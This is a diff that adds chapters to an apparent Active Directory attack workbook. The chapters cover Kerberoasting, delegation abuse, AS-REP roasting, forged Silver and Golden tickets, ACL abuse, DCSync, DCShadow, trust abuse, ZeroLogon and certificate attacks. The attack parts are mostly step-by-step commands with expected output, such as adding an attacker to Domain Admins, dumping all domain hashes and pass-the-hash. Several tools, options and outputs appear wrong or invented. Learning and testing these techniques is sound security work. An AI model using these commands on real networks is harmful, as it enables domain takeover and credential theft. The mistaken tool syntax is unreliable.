@@ -1090,3 +1090,905 @@ A **service account** is a non-human user that runs server applications, like SQ
 -   **Attack Type:** Kerberos Credential Theft → Kerberoasting
     
 -   **Attack Path:** Enumerate SPNs → Request TGS → Crack tickets → Authenticate as service account.
+
+
+## Kerberos Attacks
+
+_A deep dive into Kerberos-based attacks and ticket abuses._
+
+### Key Concepts
+
+-   **Kerberos**  
+    The core authentication protocol in AD. It issues time-limited tickets instead of sending passwords over the network.
+    
+-   **Key Distribution Center (KDC)**  
+    The AD service on Domain Controllers that issues tickets. It has two parts: the Authentication Service (AS) and the Ticket Granting Service (TGS).
+    
+-   **Ticket Granting Ticket (TGT)**  
+    A ticket you obtain once by authenticating (password or PKINIT). It allows you to request service tickets (TGS) without re-entering your credentials.
+    
+-   **Ticket Granting Service (TGS) Ticket**  
+    A service-specific ticket encrypted with the service account’s key. Used to authenticate to that service.
+    
+-   **Service Principal Name (SPN)**  
+    The unique name for a service (e.g., `HTTP/srv1.lab.local`). Kerberoasting targets SPN accounts to request TGS tickets.
+    
+-   **Constrained Delegation**  
+    A setting that lets a service use your TGT to request TGS tickets for specific downstream services on your behalf. If misconfigured, attackers can perform a **double hop** attack to impersonate users across services.
+    
+-   **Double Hop**  
+    The technique of using delegated credentials from one service to access another service, e.g., impersonate a user from a web server to a database server.
+    
+-   **AS-REP Roasting**  
+    Targets accounts with Kerberos preauthentication disabled. Attackers request an AS-REP (initial TGT) without preauth, capture the encrypted response, and crack it offline to recover the password.
+    
+-   **Silver Ticket**  
+    A forged TGS for a specific service created by encrypting the ticket with the service account’s NTLM hash. Bypasses the KDC entirely, used when the service account hash is known.
+    
+-   **Golden Ticket**  
+    A forged TGT encrypted with the KRBTGT account hash. Grants unrestricted domain-wide access for its validity period.
+    
+-   **PKINIT**  
+    An extension to Kerberos initial authentication that uses X.509 certificates instead of passwords to obtain a TGT.
+    
+-   **S4U (Service for User)**  
+    Extensions allowing services to obtain tickets on behalf of users:
+    
+    -   **S4U2Self:** A service requests a TGS for a user without the user’s credentials.
+        
+    -   **S4U2Proxy:** A service uses its own TGS and an S4U2Self ticket to request a second TGS for another service.
+        
+-   **Rubeus**  
+    A C# tool for Kerberos abuse: ticket requests (AS-REP, S4U), ticket renewal, Silver/Golden ticket forging, and harvesting.
+    
+
+----------
+
+### 1. Kerberoasting (Linux & Windows)
+
+_Request TGS tickets for service accounts tagged with SPNs and crack them offline to reveal their passwords._
+
+#### Deep Dive & Analogy
+
+Imagine a busy hotel (AD forest) where each guest (user) has a master keycard (TGT) issued at the front desk (KDC). To enter a specific room (service), you request a room-key (TGS) from the front desk. That key is encoded with the room’s lock combination (service account password). In Kerberoasting, you:
+
+![enter image description here](https://github.com/ShubhamDubeyy/Active-Directory-Workbook/blob/main/kerberoast.png?raw=true)
+
+Attackers skip step 4 and grab the encoded room-key (TGS) in step 3. They then try all possible room combinations (password guesses) offline until the key unlocks, revealing the service account’s password.
+
+#### Key Concepts
+
+-   **Service Account**: A special account that services (like SQL, HTTP) use – akin to a hotel room’s lock code.
+    
+-   **Service Principal Name (SPN)**: The official room number registered in the hotel directory (e.g., `HTTP/SRV1.lab.local`).
+    
+-   **Ticket Granting Service (TGS)**: The encoded room-key for that SPN.
+    
+-   **Offline Cracking**: Trying password guesses against the encrypted ticket without talking to the hotel staff (DC), avoiding alarms.
+    
+
+#### Tools & Commands
+
+-   **GetUserSPNs.py** (Impacket)
+    
+    ```bash
+    # Step 1: Request TGS for all SPN accounts
+    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:Pass > spn.hashes
+    
+    ```
+    
+    _Expected Output_: `Hash for svc_http@LAB.LOCAL saved in spn.hashes`
+    
+-   **hashcat**
+    
+    ```bash
+    # Step 2: Crack TGS hashes offline (mode 13100)
+    hashcat -m 13100 spn.hashes wordlist.txt
+    
+    ```
+    
+    _Expected Output_: `Recovered: svc_http:P@ssw0rd123`
+    
+-   **kinit**
+    
+    ```bash
+    # Step 3: Validate cracked password by obtaining a TGT
+    kinit svc_http@LAB.LOCAL
+    
+    ```
+    
+    _Expected Output_: No error; new ticket in cache.
+    
+
+#### Step-by-Step Guide
+
+1.  **Discover SPN Accounts**
+    
+    ```bash
+    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local" "(servicePrincipalName=*)" sAMAccountName,servicePrincipalName
+    
+    ```
+    
+    _Look for lines:_
+    
+    ```text
+    sAMAccountName: svc_http
+    servicePrincipalName: HTTP/SRV1.lab.local
+    
+    ```
+    
+2.  **Request TGS Tickets**
+    
+    ```bash
+    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:Pass > spn.hashes
+    
+    ```
+    
+    _Check_: `spn.hashes` contains encrypted tickets.
+    
+3.  **Offline Cracking**
+    
+    ```bash
+    hashcat -m 13100 spn.hashes wordlist.txt
+    
+    ```
+    
+    _Result_: Plaintext passwords, e.g., `svc_http:P@ssw0rd123`.
+    
+4.  **Validate Credentials**
+    
+    ```bash
+    kinit svc_http@LAB.LOCAL
+    
+    ```
+    
+    _Success Indicator_: No error; `klist` shows new TGT.
+    
+
+----------
+
+### 2. Kerberos Double Hop & Constrained Delegation
+
+_Exploit services configured to delegate on behalf of users._
+
+#### Tools & Commands
+
+-   **Get-DomainObject** (PowerView)
+    
+    ```powershell
+    # List services with constrained delegation
+    Import-Module .\PowerView.ps1
+    Get-DomainObject -SearchBase "OU=Services,DC=lab,DC=local" -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo
+    
+    ```
+    
+    _Expected Output:_ Lists service accounts and allowed SPNs.
+    
+-   **Rubeus**
+    
+    ```powershell
+    # Perform S4U2Self to get TGS for target user
+    Rubeus.exe s4u /user:svc_http /impersonateuser:Administrator /service:HTTP/srv1.lab.local
+    
+    ```
+    
+    _Expected Output:_ A new TGS ticket for Administrator is injected into cache.
+    
+
+#### Step-by-Step
+
+1.  Identify services with constrained delegation.
+    
+2.  Use Rubeus S4U2Self to request a TGS as Administrator.
+    
+3.  Access service as Administrator without AD credentials.
+    
+
+----------
+
+### 3. AS-REP Roasting & Silver Ticket Attacks
+
+_Extract AS-REP hashes and forge service tickets._
+
+#### Tools & Commands
+
+-   **GetNPUsers.py** (Impacket)
+    
+    ```bash
+    # Extract AS-REP hashes
+    GetNPUsers.py -dc-ip dc1.lab.local lab.local/ -no-pass > asrep.hashes
+    
+    ```
+    
+    _Expected Output:_ Lines like `svc_backup:...`
+    
+-   **hashcat**
+    
+    ```bash
+    hashcat -m 18200 asrep.hashes wordlist.txt
+    
+    ```
+    
+    _Expected Output:_ `Recovered: svc_backup:MyBackupPass`
+    
+-   **Rubeus** (Silver Ticket)
+    
+    ```powershell
+    # Forge Silver Ticket for HTTP service
+    Rubeus.exe silver /domain:lab.local /sid:S-1-5-21... /rc4:ServiceAccountNTLMHash /service:HTTP/srv1.lab.local /target:SRV1
+    
+    ```
+    
+    _Expected Output:_ `Ticket \\srv1\HTTP injected into kerb cache successfully`
+    
+
+#### Step-by-Step
+
+1.  AS-REP Roasting: find preauth-disabled accounts, extract and crack.
+    
+2.  Silver Ticket: use known service hash to forge TGS.
+    
+3.  Authenticate to the service using the forged ticket.
+    
+
+----------
+
+### Expected Result
+
+-   Plaintext passwords for service and no-preauth accounts.
+    
+-   Active S4U TGS for privileged users.
+    
+-   Forged Silver Tickets in cache enabling service access.
+    
+
+----------
+
+### Mitigation & Hardening
+
+-   Enforce Kerberos preauthentication for all accounts.
+    
+-   Disable unconstrained or restricted delegation where not required.
+    
+-   Monitor for anomalous S4U requests and ticket usage.
+    
+-   Rotate service and krbtgt passwords regularly.
+    
+
+----------
+
+### References
+
+1.  [Kerberoasting Explained](https://adsecurity.org/?p=1438)
+    
+2.  [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
+    
+3.  [Impacket Toolkit](https://github.com/SecureAuthCorp/impacket)
+    
+
+----------
+
+## ACL & DCSync Abuse
+
+_Understand how to abuse AD’s permission model and replication features._
+
+### Key Concepts
+
+-   **Access Control List (ACL)**  
+    Each AD object has an ACL: a list of who can do what. Permissions (ACEs) include:
+    
+    -   **GenericAll**: Full control—read, write, delete, and modify permissions.
+        
+    -   **GenericWrite**: Modify object properties and add child objects.
+        
+    -   **WriteDacl**: Change the ACL itself—add or remove ACEs.
+        
+    -   **Replicating Directory Changes** (`DS-Replication-Get-Changes`): Permission to pull password hashes via DCSync.
+        
+-   **DCSync**  
+    Abuse of the `Replicating Directory Changes` ACL to request password hashes directly from a DC, as if you were a DC. No plaintext password needed.
+    
+-   **DCShadow**  
+    A stealthy replication attack where you register a rogue domain controller and push changes (e.g., new admin account) back to the real DCs without detection.
+    
+
+----------
+
+### ACL Enumeration Techniques
+
+_Discover who holds powerful permissions on AD objects._
+
+#### Tools & Commands
+
+-   **Get-ObjectAcl** (PowerShell)
+    
+    ```powershell
+    # Enumerate ACLs on an OU or object
+    Get-ObjectAcl -DistinguishedName "OU=Protected,DC=lab,DC=local" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights
+    
+    ```
+    
+    _Expected Output:_
+    
+    ```text
+    IdentityReference    ActiveDirectoryRights
+    -----------------    ---------------------
+    LAB\\AdminGroup     GenericAll
+    LAB\\BackupOps     DS-Replication-Get-Changes
+    
+    ```
+    
+-   **BloodHound** (CLI)
+    
+    ```bash
+    # Using SharpHound to collect ACL data
+    SharpHound.exe --CollectionMethod ACL
+    
+    ```
+    
+    _Expected Output Files:_ `acls.json` showing ACEs graph data.
+    
+
+----------
+
+### ACL Abuse Tactics
+
+_Leverage powerful ACEs to escalate privileges immediately._
+
+#### Actions
+
+1.  **GenericAll on a group**
+    
+    ```powershell
+    # Add yourself to high-privilege group
+    Add-ADGroupMember -Identity "Domain Admins" -Members "AttackerUser"
+    
+    ```
+    
+    _Effect:_ Instant Domain Admin rights.
+    
+2.  **GenericWrite on a user**
+    
+    ```powershell
+    # Reset password of an admin account
+    Set-ADAccountPassword -Identity "AdminUser" -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
+    
+    ```
+    
+    _Effect:_ Control over admin credentials.
+    
+3.  **WriteDacl on an OU**
+    
+    ```powershell
+    # Grant Replicating Directory Changes to self on domain root
+    $acl = Get-Acl AD:\DC=lab,DC=local
+    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("LAB\\AttackerUser","DS-Replication-Get-Changes","Allow")
+    $acl.AddAccessRule($ace)
+    Set-Acl AD:\DC=lab,DC=local $acl
+    
+    ```
+    
+    _Effect:_ Prepare for DCSync by granting needed replication rights.
+    
+
+----------
+
+### DCSync & DCShadow
+
+_Extract or inject data via AD replication protocols._
+
+#### Tools & Commands
+
+-   **secretsdump.py** (Impacket) – DCSync
+    
+    ```bash
+    secretsdump.py -just-dc lab.local/AttackerUser:Pass@dc1.lab.local
+    
+    ```
+    
+    _Expected Output:_ NTLM hashes of all domain accounts, including krbtgt.
+    
+-   **Invoke-DCShadow** (PowerShell) – DCShadow
+    
+    ```powershell
+    Import-Module .\DSInternals.psm1
+    Invoke-DCShadow -DomainController dc1.lab.local -AddReplicaLink
+    
+    ```
+    
+    _Expected Output:_ Confirmation that rogue DC object registered and changes replicated.
+    
+
+----------
+
+### Step-by-Step Guide
+
+1.  **Enumerate ACLs for replication rights**
+    
+    ```powershell
+    # List ACL entries on domain root
+    Get-ObjectAcl -DistinguishedName "DC=lab,DC=local" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights
+    
+    ```
+    
+    _Purpose_: Identify who can replicate directory changes.  
+    _Look for_: `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All` rights.
+    
+2.  **If you have WriteDacl, grant replication rights**
+    
+    ```powershell
+    # Fetch current ACL
+    $acl = Get-Acl "AD:\DC=lab,DC=local"
+    # Create replication ACE for your user
+    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+      "LAB\AttackerUser",
+      "DS-Replication-Get-Changes,DS-Replication-Get-Changes-All",
+      "Allow"
+    )
+    # Add and apply
+    $acl.AddAccessRule($ace)
+    Set-Acl "AD:\DC=lab,DC=local" $acl
+    
+    ```
+    
+    _Purpose_: Use existing ACL permissions to elevate to replication.
+    
+3.  **Run DCSync with secretsdump**
+    
+    ```bash
+    # Dump all domain accounts via replication rights
+    secretsdump.py -just-dc lab.local/AttackerUser:Pass@dc1.lab.local
+    
+    ```
+    
+    _Purpose_: Extract NTLM hashes without touching the DC database directly.  
+    _Output_: Lines listing account names and corresponding hashes.
+    
+4.  **Perform DCShadow to inject changes**
+    
+    ```powershell
+    # Register rogue DC and perform stealth replication changes
+    Import-Module .\DSInternals.psm1
+    Invoke-DCShadow -DomainController dc1.lab.local -AddReplicaLink
+    # Example: create new admin account
+    Add-DomainObject -Type user -Name "ShadowAdmin" -SamAccountName "ShadowAdmin" -Password (ConvertTo-SecureString "P@ssW0rd!" -AsPlainText -Force)
+    
+    ```
+    
+    _Purpose_: Push unauthorized changes that appear as normal replication.  
+    _Verify_: Check Security Event ID 5136 for directory service modifications.
+    
+
+----------
+
+### Expected Result
+
+-   ACL enumeration reveals who can replicate or control objects.
+    
+-   DCSync outputs full NTDS.dit hashes.
+    
+-   DCShadow registers a rogue DC and writes changes undetected.
+    
+
+----------
+
+### Mitigation & Hardening
+
+-   Remove `DS-Replication-Get-Changes` from non-admin principals.
+    
+-   Monitor for unusual replication requests in DC event logs.
+    
+-   Audit and tighten ACLs on domain root and critical OUs.
+    
+
+----------
+
+### Next Steps
+
+1.  **Pass-the-Hash (PtH)**
+    
+    -   **What it is:** Authenticate to services using an NTLM hash directly, without needing the plaintext password.
+        
+    -   **Tool Example:** `pth-winexe`, `Impacket psexec.py`
+        
+        ```bash
+        psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:1122334455... LAB\Administrator@dc1.lab.local cmd.exe
+        
+        ```
+        
+    -   **Use Case:** Access file shares or execute commands as a high-privilege account using its hash.
+        
+2.  **Golden Ticket Forging**
+    
+    -   **What it is:** Create a forged Ticket Granting Ticket (TGT) using the `krbtgt` account hash, granting unlimited domain access.
+        
+    -   **Tool Example:** Rubeus or Impacket’s `ticketer.py`
+        
+        ```powershell
+        Rubeus.exe golden /domain:lab.local /sid:S-1-5-21-... /krbtgt:5566778899... /user:krbtgt /aes256:... /ticket:golden.ticket
+        klist -li 0x3e7
+        klist set-caching golden.ticket
+        
+        ```
+        
+    -   **Use Case:** Maintain persistent, stealthy Domain Admin access; bypasses password changes of the krbtgt account until ticket expiry.
+        
+3.  **Cleanup**
+    
+    -   **Remove DCShadow Objects:**
+        
+        ```powershell
+        Invoke-DCShadow -Target dc1.lab.local -RemoveReplicaLink
+        
+        ```
+        
+    -   **Revert ACL Changes:** Remove the ACE you added for replication rights.
+        
+4.  **Detection & Recovery**
+    
+    -   Monitor for unusual Kerberos TGT requests (Event ID 4768) with high lifetimes.
+        
+    -   Rotate `krbtgt` account password twice, 24 hours apart, to invalidate forged tickets.
+        
+
+----------
+
+## Domain Trust & Forest Attacks
+
+_Move laterally across trust boundaries by abusing domain trust relationships._
+
+### Key Concepts
+
+-   **Domain Trust**  
+    A link between two AD domains that allows users in one domain to access resources in another. Trusts can be one-way or two-way, external or forest.
+    
+-   **Trust Direction**
+    
+    -   **Child → Parent**: The child domain trusts the parent; users in child can access parent resources.
+        
+    -   **Parent → Child**: The parent trusts the child; users in parent access child resources.
+        
+-   **Cross-Forest Trust**  
+    A trust between separate AD forests, allowing limited authentication across organizational boundaries.
+    
+-   **SID Filtering**  
+    A protection that strips unauthorized SIDs from cross-forest tokens; bypassing it enables high-privilege impersonation.
+    
+
+----------
+
+### Simplified Real-World Trust Diagram
+
+![enter image description here](https://github.com/ShubhamDubeyy/Active-Directory-Workbook/blob/main/Forest.png?raw=true)
+
+-   **Child Office ↔ Headquarter**: Child trusts Parent for Sales to access core resources.
+    
+-   **Headquarter ↔ Sister**: Two-way forest trust sharing user authentication.
+    
+-   **Headquarter ↔ Backup**: One-way trust allowing Backup domain to replicate from Headquarter.
+    
+-   **Headquarter ↔ External Partner**: External forest trust with limited access.
+    
+
+### 1. Domain Trusts Primer
+
+_Identify and understand the trust relationships in your environment._
+
+#### Tools & Commands
+
+-   **nltest**
+    
+    ```bat
+    # List trusts for LAB domain
+    nltest /domain_trusts
+    
+    ```
+    
+    _Expected Output Snippet:_
+    
+    ```text
+    Trusted domain list for domain \"LAB\":
+      PARENT.lab.local (FOREST)
+      CHILD.lab.local  (TREE_ROOT)
+    
+    ```
+    
+-   **Get-ADTrust** (PowerShell)
+    
+    ```powershell
+    Import-Module ActiveDirectory
+    Get-ADTrust -Filter * | Format-Table Name,TrustType,Direction,ForestTransitive
+    
+    ```
+    
+    _Expected Output Snippet:_
+    
+    ```text
+    Name        TrustType Direction ForestTransitive
+    ----        --------- --------- ----------------
+    PARENT      Forest    Outbound True
+    CHILD       External  Inbound  False
+    
+    ```
+    
+
+----------
+
+### 2. Child → Parent Trust Abuse (Linux & Windows)
+
+_Exploit an outbound child-to-parent trust to authenticate in the parent domain._
+
+#### Tools & Commands
+
+-   **evil-winrm** (Windows) / **crackmapexec**
+    
+    ```bash
+    # Linux example with CME
+    cme smb CHILD.lab.local/administrator@PARENT.lab.local -p 'Password1!'
+    
+    ```
+    
+    _Expected Output Snippet:_
+    
+    ```text
+    PARENT\\administrator:Password1! (SMB)  
+    [+] Logged in as PARENT\\administrator (SID S-1-5-21-...).
+    
+    ```
+    
+
+----------
+
+### 3. Cross-Forest Trust Abuse (Linux & Windows)
+
+_Bypass SID filtering to impersonate high-privilege accounts in another forest._
+
+#### Key Concepts
+
+-   **SID Filtering Bypass**  
+    When disabled, users can add arbitrary SIDs to their token to escalate privileges across forests.
+    
+
+#### Tools & Commands
+
+-   **impacket-AddComputer.py**
+    
+    ```bash
+    # Command breakdown:
+    # PARENT.lab.local/user:Pass => Credentials used (a user in parent domain)
+    # -target-domain CHILD.lab.local    => Domain being joined/impersonated
+    # -target-user 'lab\Administrator' => Account in target domain to impersonate
+    AddComputer.py PARENT.lab.local/user:Pass \
+      -target-domain CHILD.lab.local -target-user 'lab\Administrator'
+    
+    ```
+    
+    _What happens?_
+    
+    -   The tool uses ParentDomainUser credentials to authenticate to CHILD.lab.local.
+        
+    -   It forges a machine account in CHILD and maps the Administrator SID into the token, effectively letting you log in as CHILD\Administrator.
+        
+    
+    _Expected Output Snippet:_
+    
+    ```text
+    [+] Domain joined: CHILD.lab.local as lab\Administrator
+    
+    ```
+    
+-   **Rubeus**
+    
+    ```powershell
+    Rubeus.exe ptt /ticket:crossforest.ticket
+    
+    ```
+    
+    _Expected Output:_ Forged ticket injected, access CHLD resources as high-priv user.
+    
+
+----------
+
+### Expected Result
+
+-   Successful listing of trust relationships.
+    
+-   Authentication in parent domain via child domain credentials.
+    
+-   Cross-forest resource access as high-privilege user when SID filtering is disabled.
+    
+
+----------
+
+### Mitigation & Hardening
+
+-   Enforce selective authentication on trusts to restrict which users can traverse.
+    
+-   Ensure SID filtering is enabled on all cross-forest trusts.
+    
+-   Monitor for unusual logons from trusted domains.
+    
+
+----------
+
+### Next Steps
+
+1.  Use compromised parent credentials to enumerate and pivot deeper.
+    
+2.  Clean up any forged tickets or SMB sessions to avoid detection.
+
+## Advanced Persistence & “Bleeding-Edge”
+
+_Explore the latest, most evasive techniques for maintaining access and abusing modern AD features._
+
+### Key Concepts
+
+-   **Bleeding-Edge Vulnerabilities**  
+    Newly discovered flaws in AD components (e.g., ZeroLogon) that allow privileged access without credentials.
+    
+-   **Misconfigurations**  
+    Stale objects, over-permissive ACLs, leftover trusts or orphaned accounts that grant unintended access.
+    
+-   **Golden & Silver Tickets**  
+    Forged Kerberos tickets (TGT/TGS) using compromised hashes for domain-wide or service-specific access.
+    
+-   **Shadow Credentials**  
+    Certificates or keys that live outside normal AD objects but grant access when presented.
+    
+-   **Certificate-Based Attacks**  
+    Abuse of AD CS templates or smart-card logon (PKINIT) to create persistent, password-less accounts.
+    
+
+----------
+
+### 1. “Bleeding-Edge” Vulnerabilities
+
+_Leverage zero-day or newly patched weaknesses in AD protocols or services._
+
+#### Tools & Commands
+
+-   **CVE-2020-1472 (ZeroLogon) PoC**
+    
+    ```bash
+    # Run ZeroLogon exploit to obtain machine account password
+    python3 ZeroLogon.py dc1.lab.local
+    
+    ```
+    
+    _Expected Output:_ `SUCCESS: Exploit complete, authenticated as DC$ account!`
+    
+-   **PrintSpoofer**
+    
+    ```powershell
+    Import-Module .\PrintSpoofer.ps1
+    Invoke-PrintSpoofer -DC dc1.lab.local
+    
+    ```
+    
+    _Expected Output:_ `Hash captured: DC$::DOMAIN:010100...`
+    
+
+----------
+
+### 2. Miscellaneous Misconfigurations
+
+_Find and abuse stale or misconfigured AD objects._
+
+#### Tools & Commands
+
+-   **BloodHound**
+    
+    ```bash
+    SharpHound.exe --CollectionMethod All
+    
+    ```
+    
+    _Expected Output Files:_ `objects.json`, `acls.json`, highlighting stale trusts and orphaned accounts.
+    
+-   **PowerView**
+    
+    ```powershell
+    # Find stale computer accounts not changed in 90 days
+    Get-ADComputer -Filter {LastLogonTimestamp -lt (Get-Date).AddDays(-90)} | Select Name,LastLogonTimestamp
+    
+    ```
+    
+    _Expected Output Snippet:_ Lists old computer accounts to target.
+    
+
+----------
+
+### 3. Kerberos Golden Ticket & Silver Ticket
+
+_Forge and inject tickets for persistence._
+
+#### Tools & Commands
+
+-   **Rubeus Golden Ticket**
+    
+    ```powershell
+    Rubeus.exe golden /domain:lab.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
+    klist -li 0x3e7
+    
+    ```
+    
+    _Expected Output:_ `Loaded ticket [Golden Ticket] in cache.`
+    
+-   **Rubeus Silver Ticket**
+    
+    ```powershell
+    Rubeus.exe silver /service:cifs /target:SRV1 /rc4:SERVICE_HASH /ticket:silver.kirbi
+    
+    ```
+    
+    _Expected Output:_ `Silver ticket injected for HTTP/SRV1.lab.local.`
+    
+
+----------
+
+### 4. Shadow Credentials & Certificate-Based Attacks
+
+_Use certificates and keys outside normal user objects for stealth._
+
+#### Tools & Commands
+
+-   **Certify** (BloodHound plugin)
+    
+    ```powershell
+    # Enumerate vulnerable templates
+    Import-Module .\Certify.psm1
+    Get-CertificateTemplate | Where-Object { $_.AutoEnroll -eq $true }
+    
+    ```
+    
+    _Expected Output Snippet:_ Lists templates with Autoenroll for Authenticated Users.
+    
+-   **ADCSploit**
+    
+    ```bash
+    # Request a certificate for persistence
+    python3 adcsploit.py --template User --domain lab.local --dc dc1.lab.local
+    
+    ```
+    
+    _Expected Output:_ `Certificate issued: user.pfx`
+    
+
+----------
+
+### Expected Result
+
+-   Exploitable vulnerabilities identified and leveraged for high-privilege access.
+    
+-   Misconfigured AD objects discovered and abused for persistence.
+    
+-   Golden/Silver tickets loaded, granting long-term access.
+    
+-   Rogue certificates/keys created for stealth authentication.
+    
+
+----------
+
+### Mitigation & Hardening
+
+-   Apply patches for known vulnerabilities immediately.
+    
+-   Regularly audit and clean stale objects and trusts.
+    
+-   Rotate KRBTGT account password twice for golden ticket invalidation.
+    
+-   Restrict autoenroll and enforce approval workflows for certificate templates.
+    
+
+----------
+
+### Next Steps
+
+-   Use Golden/Silver tickets to move laterally and maintain persistence.
+    
+-   Clean up shadow credentials and revoke compromised certificates.
+    
+-   Monitor for unusual certificate issuance events in AD CS logs.
+    
+
+----------
